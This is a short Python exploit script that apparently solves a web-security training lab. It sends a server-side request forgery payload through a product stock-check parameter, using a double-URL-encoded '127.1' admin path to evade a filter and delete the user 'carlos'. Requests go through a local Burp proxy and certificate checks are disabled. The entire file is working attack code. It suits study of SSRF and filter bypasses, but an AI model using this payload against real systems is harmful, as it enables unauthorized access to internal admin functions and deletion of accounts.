import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# set the burp proxy

proxies={'http':'http://localhost:8080','https':'http://localhost:8080'}


def delete_carlos(s,url):
    path=url + "/product/stock"
    delete_user_payload="http://127.1/%25%36%31dmin/delete?username=carlos"
    params={'stockApi': delete_user_payload }
    # now we have to send a post request
    
    response=s.post(url=path,data=params,verify=False,proxies=proxies)
    res=response.text
    print(res)

def main():
    if(len(sys.argv))!=2:
        print("[+]Usage %s <url>" % sys.argv[0])
        print("[+]Example  %s www.example.com" % sys.argv[0])
    else:
        url=sys.argv[1]
        s=requests.Session()
        delete_carlos(s,url) # go to the check stock function hai ta



if __name__=="__main__":
    main()